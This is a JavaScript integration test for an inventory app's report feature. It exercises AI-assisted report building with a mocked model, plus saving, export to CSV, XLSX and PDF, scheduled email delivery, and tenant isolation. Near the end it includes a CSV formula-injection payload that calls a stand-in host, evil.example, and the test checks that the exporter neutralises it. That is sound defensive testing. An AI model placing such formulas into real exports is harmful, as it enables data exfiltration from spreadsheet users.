'use strict';

const test=require('node:test');
const assert=require('node:assert/strict');
const request=require('supertest');
const {startCluster}=require('../helpers/postgres-cluster');
const {openPostgres}=require('../../src/db/postgres');
const {migratePostgres}=require('../../src/db/migrate-postgres');
const {createPostgresApp}=require('../../src/postgres-app');
const catalog=require('../../src/domain/postgres-catalog-service');
const locations=require('../../src/domain/postgres-location-service');
const inventory=require('../../src/domain/postgres-inventory-engine');
const reports=require('../../src/reports/postgres-service');
const reportAsk=require('../../src/reports/postgres-ask');
const reportRegistry=require('../../src/reports/postgres-registry');
const scheduling=require('../../src/reports/postgres-scheduling');
const reportExports=require('../../src/reports/exports');
const jobs=require('../../src/operations/postgres-job-queue');
const runtimeHandlers=require('../../src/operations/postgres-runtime-handlers');
const {readWorkbook}=require('../../src/imports/xlsx-reader');
const {pricedUsage,PRICED_MODEL}=require('../helpers/postgres-model-fixture');

function csrf(html){return /name="_csrf" value="([^"]+)"/.exec(html)?.[1];}
function binary(response,callback){const chunks=[];response.on('data',(chunk)=>chunks.push(chunk));
  response.on('end',()=>callback(null,Buffer.concat(chunks)));}
async function register(agent,name,email){
  const page=await agent.get('/register');
  await agent.post('/register').type('form').send({_csrf:csrf(page.text),name,
    businessName:`${name} Business`,email,password:'report-test-password'});
}

test('governed reports query real PostgreSQL, save, export, schedule and isolate tenants',
  {timeout:120000},async(context)=>{
    const cluster=await startCluster();
    const database=openPostgres(cluster.connectionString,{applicationName:'stockchief-report-test'});
    await migratePostgres(database);
    const modelCalls=[];let reportPlanCalls=0;
    const provider={name:'anthropic',model:PRICED_MODEL,async complete(input){
      modelCalls.push(input.schemaName);
      if(input.schemaName==='stockchief_capability_plan'){
        const message=JSON.parse(input.prompt).message;
        const saving=/save|schedule/i.test(message);
        const step=(capability)=>({capability,arguments:[],dependsOn:[],continuesPending:false});
        if(/bar chart report/i.test(message)&&++reportPlanCalls===1)
          return {data:{steps:[step('read.inventory_positions')],clarifyingQuestion:''},usage:pricedUsage()};
        return {data:{steps:saving?[step('report.template.create')]:
          [step('read.custom_report')],clarifyingQuestion:''},
        usage:pricedUsage()};
      }
      if(input.schemaName==='stockchief_capability_fit')return {data:{aligned:true,reason:''},usage:pricedUsage()};
      if(input.schemaName==='stockchief_governed_report_fit')return {data:{aligned:true,reason:''},usage:pricedUsage()};
      if(input.schemaName==='stockchief_governed_report')return {data:{dataset:'stock',title:'Units by location',
        columns:[],groups:['location'],aggregate:'sum',measure:'on_hand',filters:[],sort:'total',
        direction:'desc',chart:'bar'},usage:pricedUsage()};
      if(input.schemaName==='stockchief_governed_report_save')return {data:{report:{dataset:'stock',
        title:'Morning units by location',columns:[],groups:['location'],aggregate:'sum',
        measure:'on_hand',filters:[],sort:'total',direction:'desc',chart:'bar'},
      frequency:'weekly',hourUtc:9},usage:pricedUsage()};
      if(input.schemaName==='stockchief_governed_report_followup_save')return {data:{
        title:'Weekly stock by location',frequency:'weekly',hourUtc:9},usage:pricedUsage()};
      throw new Error(`Unexpected report model request ${input.schemaName}`);
    }};
    const app=createPostgresApp({database,env:'test',sessionSecret:'report-test-secret',aiProvider:provider});
    context.after(async()=>{await app.locals.sessionStore.close();await database.close();cluster.stop();});
    const owner=request.agent(app);await register(owner,'Report Owner','report-owner@example.test');
    const ctx=(await database.query(`SELECT w.id AS "workspaceId",u.id AS "actorId" FROM workspaces w
      JOIN users u ON u.workspace_id=w.id WHERE w.name='Report Owner Business'`)).rows[0];
    const location=await locations.createLocation(database,ctx,{name:'Main',kind:'warehouse'});
    const product=await catalog.createItem(database,ctx,{name:'Copper Clamp',baseCode:'CLAMP',trackingMode:'quantity'});
    await inventory.receive(database,ctx,{skuId:product.skuIds[0],locationId:location.id,quantity:12,
      idempotencyKey:'report-fixture-receive',reference:'RPT-1'});
    const actor=(await database.query(`SELECT u.role,u.permissions,a.email FROM users u JOIN accounts a ON a.id=u.account_id
      WHERE u.workspace_id=$1 AND u.id=$2`,[ctx.workspaceId,ctx.actorId])).rows[0];
    for(const entry of reportRegistry.list(actor)){
      const detail=await reports.run(database,ctx,actor,{dataset:entry.key,
        columns:[Object.keys(entry.fields)[0]],sort:Object.keys(entry.fields)[0]});
      assert.equal(detail.provenance.dataset,entry.key);
    }
    const stock=await reports.run(database,ctx,actor,{dataset:'stock',columns:['product','sku','location','on_hand'],
      sort:'product',direction:'asc'});
    assert.equal(stock.rows.length,1);assert.equal(Number(stock.rows[0].on_hand),12);
    assert.equal(stock.rows[0].href,`/inventory/${product.itemId}`);
    assert.equal((await owner.get(stock.rows[0].href)).status,200);
    const grouped=await reports.run(database,ctx,actor,{dataset:'stock',groups:['location'],aggregate:'sum',
      measure:'on_hand',sort:'total',direction:'desc',chart:'bar'});
    assert.equal(Number(grouped.rows[0].total),12);
    assert.deepEqual(grouped.columns,['location','total']);
    const extremes=await reports.run(database,ctx,actor,{dataset:'stock',groups:['location'],
      aggregate:'maximum',measure:'on_hand',sort:'maximum',direction:'desc',chart:'bar'});
    assert.equal(Number(extremes.rows[0].maximum),12);
    const detailSpec=reports.drilldownSpec(grouped.config,['Main'],actor);
    const detail=await reports.run(database,ctx,actor,detailSpec);
    assert.equal(detail.rows.length,1);
    assert.equal(detail.rows[0].product,'Copper Clamp');
    assert.equal(detail.rows[0].href,`/inventory/${product.itemId}`);
    const monthly=await reports.run(database,ctx,actor,{dataset:'movements',groups:['occurred_on'],
      dateGrain:'month',aggregate:'sum',measure:'quantity_delta',sort:'occurred_on',
      direction:'asc',chart:'line'});
    assert.equal(Number(monthly.rows[0].total),12);
    assert.match(monthly.rows[0].occurred_on,/^\d{4}-\d{2}-01$/);
    const monthDetail=await reports.run(database,ctx,actor,
      reports.drilldownSpec(monthly.config,[monthly.rows[0].occurred_on],actor));
    assert.equal(monthDetail.rows.length,1);
    assert.equal(monthDetail.rows[0].sku,'CLAMP');
    assert.throws(()=>reports.normalize({dataset:'stock',groups:['location'],
      dateGrain:'month',aggregate:'sum',measure:'on_hand'},actor),/date grouping/i);
    assert.throws(()=>reports.drilldownSpec(grouped.config,['Main','other'],actor),/one exact report group/i);
    let reportAttempts=0;
    const repaired=await reportAsk.prepare(database,ctx,'Group stock by location and sum units',{provider:{
      async complete(input){reportAttempts++;
        if(input.schemaName==='stockchief_governed_report_fit')return {data:{aligned:true,reason:''}};
        if(reportAttempts===2)assert.match(input.prompt,/Choose a displayed field to sort/);
        return {data:{dataset:'stock',title:'Stock by location',columns:[],groups:['location'],
          aggregate:'sum',measure:'on_hand',filters:[],sort:reportAttempts===1?'nonexistent':'total',
          direction:'desc',chart:'bar'}};
      }}});
    assert.equal(reportAttempts,3);assert.equal(repaired.status,'ANSWERED');
    let semanticPlans=0;
    const corrected=await reportAsk.prepare(database,ctx,
      'Show stock by location, largest on-hand total first in a bar chart',{provider:{
        async complete(input){if(input.schemaName==='stockchief_governed_report_fit')
          return {data:{aligned:input.prompt.includes('"sort":"total"'),
            reason:'The first plan sorts the location label, not the total.'}};
        semanticPlans++;
        if(semanticPlans===2)assert.match(input.prompt,/sorts the location label/);
        return {data:{dataset:'stock',title:'Stock by location',columns:[],groups:['location'],
          aggregate:'sum',measure:'on_hand',filters:[],sort:semanticPlans===1?'location':'total',
          direction:'desc',chart:'bar'}};
      }}});
    assert.equal(semanticPlans,2);assert.equal(corrected.status,'ANSWERED');
    const followup=await reportAsk.prepare(database,ctx,
      'For that report, keep the same stock totals by location but only include Main',{provider:{
        async complete(input){
          const prompt=JSON.parse(input.prompt);
          if(input.schemaName==='stockchief_governed_report_fit'){
            assert.deepEqual(prompt.previousReport.groups,['location']);
            return {data:{aligned:true,reason:''}};
          }
          assert.equal(prompt.previousReport.dataset,'stock');
          assert.equal(prompt.previousReport.measure,'on_hand');
          return {data:{...prompt.previousReport,
            filters:[{field:'location',operator:'equals',value:'Main'}]}};
        }},priorReport:corrected.reportConfig});
    assert.equal(followup.status,'ANSWERED');
    assert.deepEqual(followup.reportConfig.filters,
      [{field:'location',operator:'equals',value:'Main'}]);
    assert.deepEqual(followup.reportConfig.groups,['location']);
    assert.throws(()=>reports.normalize({dataset:'payments',groups:['status'],aggregate:'sum',
      measure:'amount_minor',sort:'total'},actor),/currency/i);
    const askPage=await owner.get('/ask');
    const ask=await owner.post('/ask').type('form').send({_csrf:csrf(askPage.text),
      message:'Build a bar chart report of stock by location and sum units'});
    assert.equal(ask.status,303);
    assert.equal(reportPlanCalls,2);
    const askResult=await owner.get('/ask');assert.equal(askResult.status,200);
    assert.match(askResult.text,/Units by location/);assert.match(askResult.text,/12/);
    assert.match(askResult.text,/Report bar chart/);
    const askReportId=(await database.query(`SELECT id FROM stockchief_runtime.assistant_interactions
      WHERE workspace_id=$1 AND actor_user_id=$2 AND intent ? 'reportConfig'
      ORDER BY created_at DESC,id DESC LIMIT 1`,[ctx.workspaceId,ctx.actorId])).rows[0].id;
    assert.match(askResult.text,new RegExp(`/reports/from-ask/${askReportId}`));
    const askBuilder=await owner.get(`/reports/from-ask/${askReportId}`);
    assert.equal(askBuilder.status,200);
    assert.match(askBuilder.text,/Customize Ask report/);
    assert.match(askBuilder.text,/value="on_hand" selected/);
    const saveAsk=await owner.post('/ask').type('form').send({_csrf:csrf(askResult.text),
      message:'Save that exact report as Weekly stock by location and schedule it Mondays at 09:00 UTC'});
    assert.equal(saveAsk.status,303);
    const proposal=(await database.query(`SELECT id,status,payload FROM stockchief_runtime.assistant_action_proposals
      WHERE workspace_id=$1 AND action_type='report.template.create'
      ORDER BY created_at DESC,id DESC LIMIT 1`,[ctx.workspaceId])).rows[0];
    assert.equal(proposal.status,'PENDING');
    assert.equal(proposal.payload.schedule.hour,9);
    assert.equal(proposal.payload.definition.sort,'total');
    assert.equal(proposal.payload.definition.direction,'desc');
    assert.equal(proposal.payload.definition.chart,'bar');
    assert.deepEqual(proposal.payload.definition.groups,['location']);
    const review=await owner.get(`/actions/${proposal.id}`);assert.equal(review.status,200);
    const approval=await owner.post(`/actions/${proposal.id}/approve`).type('form').send({_csrf:csrf(review.text)});
    assert.equal(approval.status,303);
    const askSaved=(await database.query(`SELECT id,schedule_frequency,schedule_hour_utc FROM
      stockchief_runtime.report_templates WHERE workspace_id=$1 AND owner_user_id=$2
      AND title='Weekly stock by location'`,[ctx.workspaceId,ctx.actorId])).rows[0];
    assert.equal(askSaved.schedule_frequency,'weekly');assert.equal(askSaved.schedule_hour_utc,9);
    assert.ok(modelCalls.includes('stockchief_governed_report'));
    assert.rejects(()=>reports.run(database,ctx,actor,{dataset:'stock',columns:['product'],
      filters:[{field:'secret_sql',operator:'contains',value:'x'}]}),/valid report filters/i);
    const reportsPage=await owner.get('/reports');assert.equal(reportsPage.status,200);
    assert.match(reportsPage.text,/Stock by product and location/);
    const builder=await owner.get('/reports/builder?dataset=stock');assert.equal(builder.status,200);
    const token=csrf(builder.text);assert.ok(token);
    const preview=await owner.post('/reports/run').type('form').send({_csrf:token,dataset:'stock',
      title:'Warehouse stock',columns:['product','sku','location','on_hand'],sort:'product',direction:'asc'});
    assert.equal(preview.status,200);assert.match(preview.text,/Copper Clamp/);
    assert.match(preview.text,/href="\/reports\/builder\?draft=1"/);
    const customize=await owner.get('/reports/builder?draft=1');assert.equal(customize.status,200);
    assert.match(customize.text,/value="Warehouse stock"/);
    const groupedPreview=await owner.post('/reports/run').type('form').send({_csrf:token,dataset:'stock',
      title:'Stock by location',groups:['location'],aggregate:'sum',measure:'on_hand',sort:'total',chart:'bar'});
    assert.match(groupedPreview.text,/See source records/);
    const drilled=await owner.post('/reports/drilldown').type('form').send({_csrf:csrf(groupedPreview.text),
      definition:JSON.stringify(grouped.config),groupValues:JSON.stringify(['Main'])});
    assert.equal(drilled.status,200);
    assert.match(drilled.text,/Copper Clamp/);
    assert.match(drilled.text,/Open record/);
    const saved=await owner.post('/reports/save').type('form').send({_csrf:token,dataset:'stock',
      title:'Warehouse stock',columns:['product','sku','location','on_hand'],sort:'product',direction:'asc',
      frequency:'daily',hour:'9'});
    assert.equal(saved.status,303);assert.match(saved.headers.location,/^\/reports\/saved\//);
    const reportId=saved.headers.location.split('/').at(-1);
    const view=await owner.get(saved.headers.location);assert.equal(view.status,200);
    assert.match(view.text,/Copper Clamp/);
    const csv=await owner.get(`/reports/saved/${reportId}/export.csv`);
    assert.equal(csv.status,200);assert.match(csv.text,/Copper Clamp/);
    const xlsx=await owner.get(`/reports/saved/${reportId}/export.xlsx`).buffer(true).parse(binary);
    assert.equal(xlsx.status,200);const workbook=readWorkbook(xlsx.body);
    assert.equal(workbook.sheets[0].rows[1][0],'Copper Clamp');
    const pdf=await owner.get(`/reports/saved/${reportId}/export.pdf`).buffer(true).parse(binary);
    assert.equal(pdf.status,200);assert.match(pdf.body.toString('ascii'),/^%PDF-1\.[3-7]/);
    const report=await reports.load(database,ctx,actor,reportId);
    assert.equal(report.schedule_frequency,'daily');
    const due=await database.transaction(client=>scheduling.enqueueDue(client,'2026-10-09T09:05:00.000Z'),
      {isolation:'READ COMMITTED'});
    assert.equal(due.queued,1);
    const duplicate=await database.transaction(client=>scheduling.enqueueDue(client,'2026-10-09T09:10:00.000Z'),
      {isolation:'READ COMMITTED'});
    assert.equal(duplicate.queued,0);
    const delivery=(await database.query(`SELECT * FROM stockchief_runtime.report_deliveries
      WHERE workspace_id=$1 AND template_id=$2`,[ctx.workspaceId,reportId])).rows[0];
    const sent=await scheduling.generateDelivery(database,{workspaceId:ctx.workspaceId,
      payload:{templateId:reportId,deliveryId:delivery.id}});
    assert.equal(sent.queued,true);
    const mail=(await database.query(`SELECT payload FROM stockchief_runtime.jobs WHERE id=$1`,
      [sent.emailJobId])).rows[0];
    assert.equal(mail.payload.to,'report-owner@example.test');
    assert.match(mail.payload.html,/Copper Clamp/);
    let sends=0;const handlers=runtimeHandlers.create(undefined,{emailSender:async()=>{
      sends++;return {provider:'resend',externalId:'fixture-report-email'};
    }});
    const prepared=await jobs.processOne(database,{'report.generate-delivery':handlers['report.generate-delivery']},
      {owner:'report-test-worker'});
    assert.equal(prepared.status,'COMPLETED');
    const delivered=await jobs.processOne(database,{'system.email-send':handlers['system.email-send']},
      {owner:'report-test-worker'});
    assert.equal(delivered.status,'COMPLETED');assert.equal(sends,1);
    await database.transaction(client=>scheduling.enqueueDue(client,'2026-10-09T09:20:00.000Z'),
      {isolation:'READ COMMITTED'});
    const receipt=(await database.query(`SELECT status,provider_message_id FROM stockchief_runtime.report_deliveries
      WHERE id=$1`,[delivery.id])).rows[0];
    assert.equal(receipt.status,'SENT');assert.equal(receipt.provider_message_id,'fixture-report-email');
    const other=request.agent(app);await register(other,'Other Report','other-report@example.test');
    const otherAsk=await other.get(`/reports/from-ask/${askReportId}`);assert.notEqual(otherAsk.status,200);
    const absent=await other.get(`/reports/saved/${reportId}`);assert.notEqual(absent.status,200);
    const otherExport=await other.get(`/reports/saved/${reportId}/export.csv`);assert.notEqual(otherExport.status,200);
    await database.query('UPDATE users SET role=$2,permissions=$3 WHERE id=$1',
      [ctx.actorId,'staff',JSON.stringify(['VIEW'])]);
    const restricted=await owner.get('/reports/builder?dataset=payments');assert.equal(restricted.status,404);
    assert.throws(()=>reports.normalize({dataset:'payments',columns:['amount_minor']},
      {role:'staff',permissions:['VIEW']}),/permission|authorized|view/i);
    assert.ok(reportExports.csv(stock).toString().includes('Copper Clamp'));
    const unsafe={...stock,rows:[{product:'=IMPORTXML("https://evil.example", "//x")'}],
      columns:['product']};
    assert.match(reportExports.csv(unsafe).toString(),/^"product"\r\n"'=IMPORTXML/);
    const accented=await reportExports.pdf({...unsafe,config:{title:'Caf\u00e9'}});
    assert.match(accented.toString('ascii'),/^%PDF-1\.[3-7]/);
    await assert.rejects(()=>reportExports.pdf({...unsafe,config:{title:'\u4e2d\u6587'}}),
      /cannot safely represent/);
  });
